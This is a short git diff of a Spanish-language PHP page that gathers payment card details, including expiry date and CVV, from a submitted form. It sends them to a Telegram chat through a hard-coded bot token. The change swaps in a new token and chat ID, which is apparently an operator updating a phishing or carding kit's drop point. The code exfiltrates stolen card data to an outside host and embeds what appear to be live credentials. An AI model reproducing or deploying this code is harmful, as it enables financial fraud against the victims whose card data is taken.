@@ -34,8 +34,8 @@ if($_SERVER["REQUEST_METHOD"] == "POST"){
     $contenido .= "\n💳 Fecha Exp: $fecha";
     $contenido .= "\n💳 Cvv: $cvv";
 
-    $token = "7412137944:AAEFs-BLjd_1i-ERXmd_DS8mJcVQYxbM9Do";
-    $chatId = "-4563418221";
+    $token = "8431946474:AAGwPGma91nER9-mCScFLy3AvOChIZIoa0M";
+    $chatId = "-4855438579";
     enviarMensajeTelegram($chatId,$contenido,$token);
 
 }else{
@@ -143,4 +143,5 @@ function enviarMensajeTelegram($chatId, $contenido, $token) {
     </script>
     
 </body>
+
 </html>
